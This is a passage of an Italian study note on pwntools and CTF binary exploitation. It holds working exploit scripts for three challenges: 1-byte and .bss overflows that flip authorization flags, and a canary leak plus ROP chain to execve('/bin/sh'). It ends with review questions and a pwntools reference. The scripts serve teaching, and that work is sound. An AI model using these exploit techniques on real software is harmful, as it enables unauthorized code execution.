Se mandi 33 byte che **finiscono con `\n`**, il primo ramo farebbe `password[len-1] = 0` e ti cancellerebbe il byte appena messo in `v19`. La mossa è mandare **33 byte senza `\n`**: così si prende il ramo `else`, che si limita a svuotare lo stdin con `getchar` (vedi [[#EngineeringDegree · Leak del canary e bypass in due letture|il deadlock di recvline]] per come `read`/`getchar` consumano i byte) e **non riazzera** il 33° byte. Ricorda: `read` **non** aggiunge mai il `\0` da sé.

Payload (lo schema `pleaselogin-stack-main` sulla lavagna lo riassume):

```python
p = remote(host, porta)
# ins_username: contenuto irrilevante
p.sendafter(b"Insert your Username: ", b"A\n")
# ins_password: 32 byte di riempimento + 1 byte NON nullo (finisce in v19), nessun \n nei primi 33
p.sendafter(b"Insert your Password: ", b"A"*32 + b"\x01")
p.send(b"\n")                 # consumato dal getchar del ramo else, non scritto nel buffer
# menu: scegli 3 per farti stampare la flag
p.sendlineafter(b">", b"3")
p.interactive()
```

Il 33° byte (`\x01`) finisce nel byte basso di `v19`, che da `0` diventa `1` ≠ 0 → `case 3` ti considera admin e stampa `flag.txt`. Canary, PIE, NX e RELRO restano intatti: non servivano.

> [!note] "Tutte le protezioni attive" non vuol dire sicuro
> Canary, PIE, NX, RELRO, SHSTK/IBT difendono il **control flow** (return address, GOT, esecuzione dello stack). Qui l'attacco non tocca nessuno di quelli: cambia un **dato** (un flag di autorizzazione) con un overflow di 1 byte dentro la stessa struct/frame. Una *logic/data corruption* così passa sotto il radar di tutte le mitigazioni control-flow.

### AliceInNowHereLand · Overflow di una globale su un flag adiacente in BSS

Lo stesso trucco di [[#pleaselogin · Overflow di 1 byte su un flag adiacente (nessuna mitigazione toccata)|pleaselogin]] — cambiare un **dato** che fa da gate, senza toccare il control flow — ma in memoria **globale** invece che sullo stack, e senza canary di mezzo (`checksec`: Full RELRO, NX, PIE, **No canary**).

`main` legge l'input in una variabile globale e poi controlla una seconda globale subito accanto:

```
read(0, location, 0x24);        // 0x24 = 36 byte in `location` (.bss 0x4040)
...
if (found != 0) { puts(...); win(); }   // `found` è a .bss 0x4060
else { /* ristampa il prompt e torna a leggere */ }
```

La chiave sta negli indirizzi delle due globali: `found` (`0x4060`) − `location` (`0x4040`) = `0x20` = **32 byte**. Quindi `location` è grande 32 byte e `found` è l'`int` che comincia **esattamente al 33° byte**. La `read` però ne accetta **36**: i 4 byte in eccesso cadono dritti in `found`.

`found` parte a `0`, e finché è `0` il programma resta nel ramo `else` e ti fa reinserire l'input. Basta scrivere un qualunque byte non nullo oltre i 32 di `location` per renderlo ≠ 0 → `win()` apre e stampa la flag.

```python
exe = context.binary = ELF("./chall")
p = remote(host, porta)

p.recvuntil(b">")
p.send(b"A"*32 + b"FOUND")   # 32 byte riempiono `location`, "FOUND" straripa in `found`
print(p.recvall())           # ccit{wH4t_4b0u7_7H3_wH173_r48817??}
```

`b"FOUND"` è tematico ma non necessario: basterebbe `b"A"*32 + b"\x01"`, un solo byte diverso da zero. Qui PIE e RELRO non contano nulla — non serve nessun indirizzo, l'overflow è **relativo** tra due globali adiacenti ed è il programma stesso a chiamare `win()`. Differenza con pleaselogin: lì era un off-by-one sullo stack (`read` di 33 in un buffer da 32), qui è una `read` sovradimensionata (36 vs 32) in `.bss`, senza il problema del `\n` perché non c'è nessuna ripulitura dopo la `read`.

### roppery · Leak del canary + ROP a `execve` su un menu a due primitive

Obiettivo: shell con `execve("/bin/sh", NULL, NULL)` su un binario con **canary** attivo, **NX**, Partial RELRO, **No PIE**, SHSTK/IBT marcati. È la sintesi di tutto il resto della nota: un *leak* per battere il canary + una catena **ROP** con gadget "sporchi" + `/bin/sh` già nel binario.

Il programma è un negozio di uccelli con un menu; due voci offrono due primitive diverse (si vedono in `source.c`):

- **Menu 1 → `canary()`**: `read(0, buf, 41)` in `buf[40]` (overflow di **1 byte**) seguito da `printf("Ok so we got some %s ...", buf)`. È il **leak**: il 41° byte sovrascrive il byte `\x00` (LSB) del canary, così `%s` non si ferma lì e stampa i 7 byte veri del canary (vedi [[#EngineeringDegree · Leak del canary e bypass in due letture|EngineeringDegree]] per la ricostruzione `u64(b"\x00" + 7_byte)`).
- **Menu 2 → `parrot()`**: `read(0, buf, 256)` in `buf[40]` → overflow enorme. È il **vettore ROP**.

Essendo **No PIE**, indirizzi e gadget sono costanti. I gadget utili stanno nella funzione `usefull`; non c'è `system` tra gli import, quindi la strada è `execve` via **syscall** (come [[#NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra|NotSoClean]]/[[GrandmasCake]]). `/bin/sh` è dentro il banner in `.data` — si trova con `exe.search`.

Il trucco in due tempi, con un dettaglio che fa crashare se trascurato:

```python
exe = context.binary = ELF("./roppery", checksec=False)

pop_rdi_r13_rcx_rax = p64(0x401241)   # pop rdi; pop r13; pop rcx; pop rax; ret
pop_rsi_r15         = p64(0x401249)   # pop rsi; pop r15; ret
pop_rdx             = p64(0x40123f)   # pop rdx; ret
syscall_g           = p64(0x40124d)   # syscall
binsh               = p64(next(exe.search(b"/bin/sh\x00")))   # 0x404106

p = process("./roppery")

# --- Stage 1: leak del canary (menu 1) ---
p.recvuntil(b">"); p.send(b"1\n")
p.recvuntil(b">")
p.send(b"A"*41)                       # 40 + 1 byte che calpesta lo \x00 del canary
leak = p.recvline()
canary = u64(b"\x00" + leak[59:66])   # "Ok so we got some " (18) + 41 A = 59; poi 7 byte veri

# il secondo read di canary() RICHIEDE di rimettere lo \x00, o la funzione fa
# stack smashing al return e il processo muore prima del menu 2
p.send(b"yes\x00" + b"A"*36 + b"\x00")   # 41 byte: byte[40] = \x00 → canary ripristinato
p.recvuntil(b">")

# --- Stage 2: ROP in parrot (menu 2) ---
p.sendline(b"2"); p.recvuntil(b">")
payload  = b"A"*40 + p64(canary) + b"B"*8                 # buf[40] + canary (off.40) + saved rbp
payload += pop_rdi_r13_rcx_rax + binsh + p64(0) + p64(0) + p64(59)  # rdi=binsh, r13/rcx=junk, rax=59
payload += pop_rsi_r15 + p64(0) + p64(0)                  # rsi=0 (argv), r15=junk
payload += pop_rdx + p64(0)                               # rdx=0 (envp)
payload += syscall_g                                      # execve("/bin/sh", 0, 0)
p.send(payload)
p.interactive()
```

> [!warning] Correzione · il leak che si auto-sabota: canary ricontrollato al `return`
> `canary()` fa `return v2 - __readfsqword(0x28)`: **ricontrolla il canary** in uscita. La prima `read(41)` che usi per il leak ha appena corrotto il byte `\x00` del canary. Se non lo **ripristini**, la funzione chiama `__stack_chk_fail` e il processo abortisce *prima* che tu possa scegliere il menu 2. Per questo c'è una seconda `read(41)`: mandaci 41 byte col byte di indice 40 = `\x00` (il resto è indifferente, lo `strcmp("yes")` puoi ignorarlo). È il leak che "si ripulisce da solo".

> [!warning] Correzione · off-by-6 su `/bin/sh`: `exe.search`, non il conteggio a mano
> Primo tentativo: `binsh = p64(0x4040CF + 61)`. Verificato sul binario, `0x4040CF + 61 = 0x40410C` cade sui byte `h\x00…` — cioè sull'**ultima lettera** di `/bin/sh`, e `execve("h", …)` fallisce. Il `/bin/sh\0` vero sta a `0x404106` = `0x4040CF + 55` (contati 61 invece di 55). La regola, ormai ricorrente: non contare l'offset dentro la stringa a mano, usa `next(exe.search(b"/bin/sh\x00"))` che lo trova da solo.

> [!note] Catena per `execve` con gadget "sporchi"
> I gadget di `roppery` sono gli stessi "multi-pop" di NotSoClean: `pop rdi; pop r13; pop rcx; pop rax; ret` imposta `rdi` e `rax` lasciando `r13`/`rcx` da riempire con junk; `pop rsi; pop r15; ret` dà `rsi`; `pop rdx; ret` dà `rdx`. Servono tutti e 4 i registri (`rax=59`, `rdi=&/bin/sh`, `rsi=0`, `rdx=0`): dimenticare `rdx` (envp) è l'errore tipico — `execve` con `rdx` garbage fa EFAULT. `rcx` invece è inutile impostarlo: la `syscall` lo distrugge comunque (insieme a `r11`).

## Ripasso

- **Il programma scrive un prompt senza andare a capo. Come lo riconosci?** Con `recvuntil`, usando i byte che segnano la fine del prompt.
- **Devi leggere un intero binario a 32 bit. Quali decisioni prendi?** Leggi quattro byte con `recvn(4)` e li interpreti con `u32` nell'ordine stabilito dal formato.
- **Un messaggio contiene spazi finali significativi. Come li conservi?** Se il delimitatore è `b"\n"`, usa `recvuntil(b"\n", drop=True)`. Un generico `.strip()` eliminerebbe anche gli spazi.
- **PIE attivo: come usi un leak di un return address per calcolare la base?** `base = indirizzo_leakato - offset_del_simbolo_in_IDA`, dove l'offset è quello dell'istruzione **dopo** la `call` (il return address). Poi `exe.address = base` e ogni gadget/stringa diventa `exe.search(...)` o `base + offset`.
- **Hai trovato `/bin/sh` in `.data` ma dentro una stringa più lunga. Cosa passi a `rdi`?** L'**indirizzo** del sottostringa esatta `"/bin/sh"` (`p64(binsh)`), non i suoi byte né l'inizio del simbolo che la contiene. `exe.search(b"/bin/sh\x00")` individua l'offset giusto da solo.
- **Hai solo un gadget `pop rax; pop r14; pop rcx; ret` e ti serve impostare `rax`. Quante celle metti nel payload?** Tre: una per `rax` col valore utile e due di junk (`p64(0)`) per i `pop` di `r14` e `rcx`, nell'ordine delle istruzioni. Ogni `pop` consuma una cella dallo stack, anche quelli che non ti interessano.
- **ROP a `execve` via `syscall` su un binario No PIE: ti serve il gadget `ret` per allineare lo stack a 16 byte?** No. L'allineamento a 16 byte lo richiede `movaps` dentro le funzioni di libc, non l'istruzione `syscall`.
- **Un `strcmp` confronta il tuo input con un segreto casuale che non conosci, ma puoi overfloware dentro il buffer del segreto. Come lo batti?** Scrivi la stessa stringa null-terminata sia nel tuo buffer sia (via overflow) all'inizio del buffer del segreto: `strcmp` si ferma al primo `\0`, quindi confronta solo la parte che controlli e ignora la coda casuale. Conta la posizione del `\0`, non il contenuto.
- **Il binario ha canary, PIE, NX e RELRO tutti attivi: è al sicuro da un overflow?** No. Quelle protezioni difendono il *control flow* (return address, GOT, stack non eseguibile). Un overflow che corrompe un **dato** adiacente — es. un flag `is_admin` subito dopo un buffer nella stessa struct — le bypassa tutte senza toccarle. Controlla sempre cosa c'è *subito dopo* il buffer che puoi sforare.
- **Una `read(fd, buf, n)` ti lascia `buf` utilizzabile come stringa?** Non per forza: `read` copia byte grezzi e **non** aggiunge `\0`. Se il codice conta su un terminatore scritto altrove (es. solo quando l'input finisce con `\n`), mandare dati senza `\n` può saltare quella scrittura e lasciare il buffer non terminato (o conservare un byte di overflow).
- **Leaki il canary corrompendo il suo `\x00`, ma la funzione lo ricontrolla al `return`. Come eviti il crash?** Se c'è una seconda lettura nello stesso buffer prima del `return`, usala per **rimettere `\x00`** al posto del byte di canary che avevi calpestato: il confronto torna a quadrare e la funzione esce pulita, lasciandoti proseguire.
- **Il server scrive `Challenge 1: ... Enter a key (hex): ` e `recvuntil(b":")` ti restituisce l'avanzo sbagliato. Perché?** Si è fermato al primo `:`, quello di `Challenge 1:`. Usa un delimitatore che compare una volta sola, come `b"(hex): "`.
- **Hai trovato `/bin/sh` dentro una stringa più lunga. Come ne prendi l'indirizzo senza sbagliare l'offset?** `next(exe.search(b"/bin/sh\x00"))`: trova la sottostringa esatta da sé. Il conteggio a mano (`base + offset`) è la fonte classica di off-by-N, come puntare all'ultima lettera `h` invece che a `/`.

## Collegamenti

- **Concetti correlati**: [[Buffer Overflow dello Stack]] · [[Shellcode]] · [[ROP]] · [[PIE]] · [[Calling Convention]]
- **Challenge crypto**: [[pycryptodome]] (pwntools per parlare con il server, pycryptodome per AES)
- **Mappa**: [[MOC - CyberBootCamp]]

> [!info] Approfondimento
> - [[04 - CB - Binary Exploitation 1#pwntools: lo strumento di lavoro|Lezione 4 — pwntools: lo strumento di lavoro]]

## Mappa della documentazione di pwntools

Il catalogo segue il sommario della documentazione stabile **4.15.1**, che comprende la guida introduttiva, l'installazione, i comandi da terminale, il riferimento dei moduli e un approfondimento su testo e byte. `pwn` è il punto d'ingresso semplificato usato negli esempi. `pwnlib` è il pacchetto da cui provengono le API. [Sommario ufficiale](https://docs.pwntools.com/en/stable/)

Per orientarti da terminale, `pwn version` mostra la versione installata. `pwn checksec` riassume le protezioni di un binario, `pwn elfdiff` confronta file ELF con l'ausilio di `readelf` e `pwn hex`, `pwn unhex` e `pwn phd` servono a convertire o visualizzare byte.

### Configurazione, terminale e interfaccia

| Modulo | Cosa trovi |
|---|---|
| `pwnlib.args` | Opzioni della riga di comando per gli script Python. |
| `pwnlib.atexception` | Callback per le eccezioni che escono dallo script. |
| `pwnlib.atexit` | Callback di pulizia alla terminazione. |
| `pwnlib.config` | Impostazioni caricate da file di configurazione. |
| `pwnlib.context` | Architettura, ordine dei byte, timeout e livello di log. |
| `pwnlib.exception` | Eccezioni specifiche di pwntools. |
| `pwnlib.log` | Messaggi, livelli di log e stato di avanzamento. |
| `pwnlib.replacements` | Funzioni sostitutive usate dalla libreria. |
| `pwnlib.term` | Controllo e formattazione del terminale. |
| `pwnlib.timeout` | Limiti di tempo per operazioni e blocchi. |
| `pwnlib.ui` | Scelte, domande e altre interazioni con l'utente. |
| `pwnlib.update` | Controlli per gli aggiornamenti di pwntools. |

### Processi, collegamenti e file

| Modulo | Cosa trovi |
|---|---|
| `pwnlib.adb` | Interazione con Android Debug Bridge. |
| `pwnlib.filesystem` | Accesso a file locali o su una sessione SSH. |
| `pwnlib.protocols.adb` | Strutture e messaggi del protocollo ADB. |
| `pwnlib.tubes` | API comune per scambiare byte con processi e connessioni. |
| `pwnlib.tubes.buffer` | Buffer interno dei tube. |
| `pwnlib.tubes.process` | Avvio e gestione dei processi locali. |
| `pwnlib.tubes.serialtube` | Comunicazione tramite porte seriali. |
| `pwnlib.tubes.sock` | Connessioni di rete e ascolto su socket. |
| `pwnlib.tubes.ssh` | Sessioni SSH, trasferimenti e processi remoti. |
| `pwnlib.util.net` | Informazioni sulle interfacce di rete. |
| `pwnlib.util.proc` | Informazioni sui processi tramite `/proc`. |
| `pwnlib.util.web` | Utilità per scaricare risorse web. |
| `pwnlib.useragents` | Raccolta di stringhe User-Agent. |

### Assembly, ELF e debug

| Modulo | Cosa trovi |
|---|---|
| `pwnlib.asm` | Conversione fra istruzioni testuali e codice macchina. |
| `pwnlib.constants` | Costanti dei sistemi e delle architetture supportati. |
| `pwnlib.elf.config` | Lettura di parametri della configurazione del kernel. |
| `pwnlib.elf.corefile` | Lettura dei core dump ELF. |
| `pwnlib.elf.elf` | Ispezione di file ELF, simboli, sezioni, segmenti e protezioni. |
| `pwnlib.gdb` | Integrazione con il debugger GDB. |
| `pwnlib.libcdb` | Ricerca e identificazione di versioni della libc. |
| `pwnlib.qemu` | Integrazione con QEMU per l'emulazione. |
| `pwnlib.windbg` | Integrazione con WinDbg. |

### Dati, sequenze e formati

| Modulo | Cosa trovi |
|---|---|
| `pwnlib.util.crc` | Calcolo dei checksum CRC. |
| `pwnlib.util.cyclic` | Produzione di sequenze con sottosequenze distinguibili. |
| `pwnlib.util.fiddling` | Conversioni tra bit, byte ed esadecimale e visualizzazione di dati. |
| `pwnlib.util.getdents` | Decodifica di strutture Linux per le voci di directory. |
| `pwnlib.util.hashes` | Calcolo di digest su dati e file. |
| `pwnlib.util.iters` | Combinazioni e altre operazioni su iteratori. |
| `pwnlib.util.lists` | Raggruppamento e trasformazione di sequenze. |
| `pwnlib.util.misc` | Funzioni generali per file, percorsi e processi. |
| `pwnlib.util.packing` | Codifica e decodifica di interi e composizione di record binari. |
| `pwnlib.util.safeeval` | Valutazione limitata di espressioni e valori Python. |
| `pwnlib.util.sh_string` | Rappresentazione di stringhe per la shell. |

### Moduli per CTF e sicurezza del software

| Modulo | Cosa trovi |
|---|---|
| `pwnlib.dynelf` | Risoluzione di simboli ELF basata su letture di memoria. |
| `pwnlib.encoders` | Codifiche alternative per sequenze di shellcode. |
| `pwnlib.filepointer` | Strutture interne associate ai puntatori `FILE*`. |
| `pwnlib.flag` | Funzioni per la gestione delle flag nelle CTF. |
| `pwnlib.fmtstr` | Funzioni relative alle vulnerabilità di formato. |
| `pwnlib.memleak` | Astrazione per letture parziali di memoria. |
| `pwnlib.rop.ret2dlresolve` | Supporto per la tecnica ret2dlresolve. |
| `pwnlib.rop.rop` | Rappresentazione di gadget e catene ROP. |
| `pwnlib.rop.srop` | Strutture relative alla tecnica Sigreturn-Oriented Programming. |
| `pwnlib.runner` | Interfacce per eseguire assembly o byte di codice macchina. |
| `pwnlib.shellcraft` | Raccolta di modelli assembly per architettura e sistema. |
| `pwnlib.shellcraft.aarch64` | Modelli per AArch64. |
| `pwnlib.shellcraft.amd64` | Modelli per x86-64. |
| `pwnlib.shellcraft.arm` | Modelli per ARM. |
| `pwnlib.shellcraft.common` | Componenti condivisi fra architetture. |
| `pwnlib.shellcraft.i386` | Modelli per x86 a 32 bit. |
| `pwnlib.shellcraft.mips` | Modelli per MIPS. |
| `pwnlib.shellcraft.riscv64` | Modelli per RISC-V a 64 bit. |
| `pwnlib.shellcraft.thumb` | Modelli per ARM in modalità Thumb. |

## Indice dei metodi e delle funzioni

| Metodo o funzione | Cosa fa | Come si usa | Tipo di ritorno o dell’attributo |
|---|---|---|---|
| [[pwn-asm\|asm]] | Assembla istruzioni in byte di codice macchina. | `asm(istruzioni, arch=...)` | `bytes` di default, `str` con il percorso se `extract=False` |
| [[pwn-bits\|bits]] | Scompone i byte nei singoli bit. | `bits(dati, endian="big")` | `list[int]` con le opzioni predefinite |
| [[pwn-can_recv\|can_recv]] | Verifica se ci sono dati pronti da leggere senza consumarli. | `io.can_recv(timeout=0.5)` su un tube da `process(...)` o `remote(...)` | `bool` |
| [[pwn-checksec\|checksec]] | Riassume le protezioni del binario. | `binario.checksec()` su un oggetto creato con `ELF(percorso)` | `str` con il riepilogo |
| [[pwn-clean\|clean]] | Consuma e restituisce i dati accumulati nel canale. | `io.clean(timeout=0.05)` su un tube da `process(...)` o `remote(...)` | `bytes` |
| [[pwn-close\|close]] | Chiude il canale e libera le risorse associate. | `io.close()` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-concat\|concat]] | Appiattisce di un livello un iterabile di sequenze. | `concat(sequenze)` | `list` |
| [[pwn-connected\|connected]] | Controlla lo stato del canale in una direzione. | `io.connected("any")` su un tube da `process(...)` o `remote(...)` | `bool` |
| [[pwn-context.clear\|context.clear]] | Ripristina le impostazioni predefinite del contesto. | `context.clear()` | `None` |
| [[pwn-context.copy\|context.copy]] | Copia le impostazioni correnti del contesto. | `context.copy()` | `dict` |
| [[pwn-context.local\|context.local]] | Applica impostazioni temporanee, come il log di debug. | `with context.local(log_level="debug"):` usando `context` importato da `pwn` | Gestore di contesto, usabile con `with` |
| [[pwn-context.update\|context.update]] | Imposta più opzioni del contesto con una chiamata. | `context.update(arch=..., endian=...)` | `None` |
| [[pwn-disasm\|disasm]] | Traduce il codice macchina in istruzioni leggibili. | `disasm(dati, arch=...)` | `str` con le istruzioni |
| [[pwn-ELF\|ELF]] | Apre un file ELF e ne legge architettura, simboli e proprietà. | `binario = ELF(percorso)` | Oggetto `ELF` |
| [[pwn-enhex\|enhex]] | Converte dati binari in testo esadecimale. | `enhex(dati)` | `str` |
| [[pwn-flat\|flat]] | Combina byte e interi in un unico blocco binario. | `flat(*campi, word_size=...)` | `bytes` |
| [[pwn-group\|group]] | Divide una sequenza in blocchi di dimensione fissata. | `group(dimensione, sequenza, underfull_action='ignore')` | `list` di sottosequenze |
| [[pwn-hexdump\|hexdump]] | Mostra i byte in esadecimale con i rispettivi offset. | `hexdump(dati)` | `str` con il dump |
| [[pwn-interactive\|interactive]] | Collega il canale al terminale per interagire a mano. | `io.interactive()` su un tube da `process(...)` o `remote(...)` | `None` al termine della sessione |
| [[pwn-make_packer\|make_packer]] | Crea una funzione per codificare interi con impostazioni fissate. | `make_packer(word_size, endian=..., signed=...)` | Funzione che converte un `int` in `bytes` |
| [[pwn-make_unpacker\|make_unpacker]] | Crea una funzione per decodificare campi binari con impostazioni fissate. | `make_unpacker(word_size, endian=..., signed=...)` | Funzione che converte `bytes` in un `int` |
| [[pwn-newline\|newline]] | Imposta il terminatore usato da `sendline()` e `recvline()`. | `io.newline = b"\r\n"` su un tube da `process(...)` o `remote(...)` | `bytes` quando leggi l’attributo |
| [[pwn-p8\|p8]] | Codifica un intero a 8 bit in 1 byte. | `p8(valore)` | `bytes` di lunghezza 1 |
| [[pwn-p16\|p16]] | Codifica un intero a 16 bit in 2 byte. | `p16(valore)` | `bytes` di lunghezza 2 |
| [[pwn-p32\|p32]] | Codifica un intero a 32 bit in 4 byte. | `p32(valore)` | `bytes` di lunghezza 4 |
| [[pwn-p64\|p64]] | Codifica un intero a 64 bit in 8 byte. | `p64(valore)` | `bytes` di lunghezza 8 |
| [[pwn-pack\|pack]] | Codifica un intero con una larghezza a scelta. | `pack(valore, word_size)` | `bytes` della larghezza scelta |
| [[pwn-partition\|partition]] | Raggruppa gli elementi in base al valore restituito da una funzione. | `partition(elementi, chiave, save_keys=False)` | `list` di gruppi, oppure `OrderedDict` con `save_keys=True` |
| [[pwn-poll\|poll]] | Restituisce il codice di uscita oppure `None` se il processo è ancora attivo. | `io.poll()` su un oggetto creato con `process(...)` | `int` con il codice di uscita o `None` se è ancora attivo |
| [[pwn-process\|process]] | Avvia un programma locale e restituisce un canale di I/O. | `io = process([eseguibile, ...])` | Oggetto `process` (tube locale) |
| [[pwn-recv\|recv]] | Legge fino a `n` byte appena ci sono dati. | `io.recv(n)` su un tube da `process(...)` o `remote(...)` | `bytes`, anche `b""` al timeout |
| [[pwn-recvall\|recvall]] | Raccoglie i dati fino a fine flusso e chiude il canale. | `io.recvall()` su un tube da `process(...)` o `remote(...)` | `bytes` con tutti i dati raccolti |
| [[pwn-recvline\|recvline]] | Legge una riga fino al fine riga configurato. | `io.recvline()` su un tube da `process(...)` o `remote(...)` | `bytes`, anche `b""` al timeout |
| [[pwn-recvline_contains\|recvline_contains]] | Legge fino alla prima riga che contiene uno dei frammenti indicati. | `io.recvline_contains(b"stato", drop=True, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` al timeout |
| [[pwn-recvline_endswith\|recvline_endswith]] | Legge fino a una riga che termina con uno dei suffissi indicati. | `io.recvline_endswith(b"OK", drop=True, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` al timeout |
| [[pwn-recvline_pred\|recvline_pred]] | Legge fino a una riga che soddisfa una funzione di controllo. | `io.recvline_pred(controllo, drop=True, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` al timeout |
| [[pwn-recvline_startswith\|recvline_startswith]] | Legge fino a una riga che inizia con uno dei prefissi indicati. | `io.recvline_startswith(b"stato", drop=True, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` al timeout |
| [[pwn-recvlines\|recvlines]] | Legge fino al numero di righe indicato. | `io.recvlines(numero_righe, drop=True, timeout=...)` su un tube da `process(...)` o `remote(...)` | `list[bytes]` |
| [[pwn-recvn\|recvn]] | Aspetta di ricevere esattamente `n` byte. | `io.recvn(n)` su un tube da `process(...)` o `remote(...)` | `bytes` lunghi `n`, oppure `b""` al timeout |
| [[pwn-recvpred\|recvpred]] | Legge byte fino a quando una condizione sui dati raccolti è soddisfatta. | `io.recvpred(controllo, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` al timeout |
| [[pwn-recvregex\|recvregex]] | Legge fino a una corrispondenza con un'espressione regolare. | `io.recvregex(pattern, capture=False, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes` con `capture=False`. Con `capture=True` restituisce `re.Match` per una corrispondenza o `None` se manca |
| [[pwn-recvrepeat\|recvrepeat]] | Raccoglie dati finché una lettura scade o il flusso termina. | `io.recvrepeat(timeout=0.5)` su un tube da `process(...)` o `remote(...)` | `bytes` |
| [[pwn-recvuntil\|recvuntil]] | Legge fino al delimitatore indicato. | `io.recvuntil(delimitatore)` su un tube da `process(...)` o `remote(...)` | `bytes`, anche `b""` al timeout |
| [[pwn-remote\|remote]] | Apre una connessione di rete e restituisce un canale di I/O. | `io = remote(host, porta)` | Oggetto `remote` (tube di rete) |
| [[pwn-ROP\|ROP]] | Rappresenta gadget e catene ROP. | Classe del modulo `pwnlib.rop` associata a uno o più oggetti `ELF` | Oggetto `ROP` |
| [[pwn-send\|send]] | Invia i byte forniti. | `io.send(dati)` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-sendafter\|sendafter]] | Cerca il delimitatore, poi invia i byte anche se la lettura va in timeout. | `io.sendafter(delimitatore, dati)` su un tube da `process(...)` o `remote(...)` | `bytes` letti prima di inviare, oppure `b""` al timeout |
| [[pwn-sendline\|sendline]] | Invia i byte e aggiunge il fine riga. | `io.sendline(dati)` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-sendlineafter\|sendlineafter]] | Cerca il delimitatore, poi invia una riga anche se la lettura va in timeout. | `io.sendlineafter(delimitatore, dati)` su un tube da `process(...)` o `remote(...)` | `bytes` letti prima di inviare, oppure `b""` al timeout |
| [[pwn-sendlinethen\|sendlinethen]] | Invia i dati e poi legge fino al delimitatore. | `io.sendlinethen(delimitatore, dati, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` se la lettura va in timeout |
| [[pwn-sendthen\|sendthen]] | Invia i dati e poi legge fino al delimitatore. | `io.sendthen(delimitatore, dati, timeout=...)` su un tube da `process(...)` o `remote(...)` | `bytes`, oppure `b""` se la lettura va in timeout |
| [[pwn-settimeout\|settimeout]] | Imposta il tempo d'attesa predefinito per le letture. | `io.settimeout(secondi)` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-sha256sum\|sha256sum]] | Calcola il digest SHA-256 di un blocco di dati. | `sha256sum(dati)` | `bytes` di lunghezza 32 |
| [[pwn-sha256sumhex\|sha256sumhex]] | Calcola il digest SHA-256 e lo rappresenta in esadecimale. | `sha256sumhex(dati)` | `str` di 64 caratteri |
| [[pwn-shutdown\|shutdown]] | Chiude l'invio o la ricezione. Con `"send"` puoi continuare a leggere. | `io.shutdown("send")` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-stream\|stream]] | Stampa l'output del canale man mano che arriva. | `io.stream(line_mode=True)` su un tube da `process(...)` o `remote(...)` | `bytes` con tutti i dati stampati |
| [[pwn-symbols\|symbols]] | Associa i nomi dei simboli disponibili ai loro indirizzi. | Attributo di un oggetto `ELF`. Usa `binario.symbols[nome]` per cercare un simbolo. | `dotdict` con chiavi `str` e valori `int`. La ricerca con `[nome]` dà un `int` |
| [[pwn-u8\|u8]] | Legge 1 byte come intero a 8 bit. | `u8(dati)` | `int` |
| [[pwn-u16\|u16]] | Legge 2 byte come intero a 16 bit. | `u16(dati)` | `int` |
| [[pwn-u32\|u32]] | Legge 4 byte come intero a 32 bit. | `u32(dati)` | `int` |
| [[pwn-u64\|u64]] | Legge 8 byte come intero a 64 bit. | `u64(dati)` | `int` |
| [[pwn-unbits\|unbits]] | Raggruppa i bit in byte. | `unbits(bit, endian="big")` | `bytes` |
| [[pwn-unhex\|unhex]] | Converte testo esadecimale in dati binari. | `unhex(testo)` | `bytes` |
| [[pwn-unpack\|unpack]] | Decodifica i byte come intero della larghezza specificata. | `unpack(dati, word_size)` | `int` |
| [[pwn-unpack_many\|unpack_many]] | Decodifica più interi consecutivi della stessa larghezza. | `unpack_many(dati, word_size, endian=...)` | `list[int]` |
| [[pwn-unrecv\|unrecv]] | Rimette byte all'inizio del buffer di ricezione. | `io.unrecv(dati)` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-wait_for_close\|wait_for_close]] | Attende che il canale si chiuda entro il tempo indicato. | `io.wait_for_close(timeout=2)` su un tube da `process(...)` o `remote(...)` | `None` |
| [[pwn-xor\|xor]] | Combina sequenze binarie con l'operazione XOR. | `xor(*sequenze, cut=...)` | `bytes` |
